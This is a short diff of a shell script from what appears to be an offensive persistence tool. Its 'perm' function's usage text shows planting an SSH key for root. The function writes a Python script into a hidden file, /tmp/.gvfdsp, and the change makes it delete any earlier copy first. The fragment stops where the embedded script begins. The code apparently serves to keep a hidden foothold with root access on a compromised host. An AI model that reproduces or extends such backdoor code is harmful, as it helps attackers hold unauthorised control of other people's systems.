@@ -2,6 +2,9 @@
 gglog "load 'perm' exm:\"perm 'ssh-rsa AAA..... root@xxxxx'\""
 perm(){
 keep_shell=/tmp/.gvfdsp
+if [ -f $keep_shell ];then
+	rm $keep_shell;
+fi
 if [ ! -f $keep_shell ];then
     cat << EOF >> $keep_shell
 import sys, os, time, atexit
